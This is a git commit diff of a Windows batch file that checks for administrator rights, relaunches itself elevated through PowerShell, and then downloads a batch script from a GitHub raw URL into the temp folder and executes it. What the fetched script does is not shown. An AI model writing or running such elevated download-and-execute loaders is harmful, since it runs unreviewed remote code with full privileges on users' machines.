80bd6ff760eb5ac20c1285c19da6a2936d46d733
Voltex-XD <96913694+Voltex-XD@users.noreply.github.com>
2025-04-13 16:52:12 +0300

    Add files via upload

--- script1.bat
+++ script1.bat
@@ -1,2 +1,12 @@
 @echo off
-runas /user:%USERNAME% "curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/script.bat -o \"%TEMP%\\script.bat\" && cmd /c call \"%TEMP%\\script.bat\""
+:: Check for admin rights
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    echo [INFO] Scriptul nu ruleaza ca Administrator. Relansare cu drepturi elevate...
+    powershell -Command "Start-Process '%~f0' -Verb runAs"
+    exit /b
+)
+
+echo Administrator permision gotted.
+
+curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/script.bat > "%TEMP%\script.bat" && cmd /c "%TEMP%\script.bat"
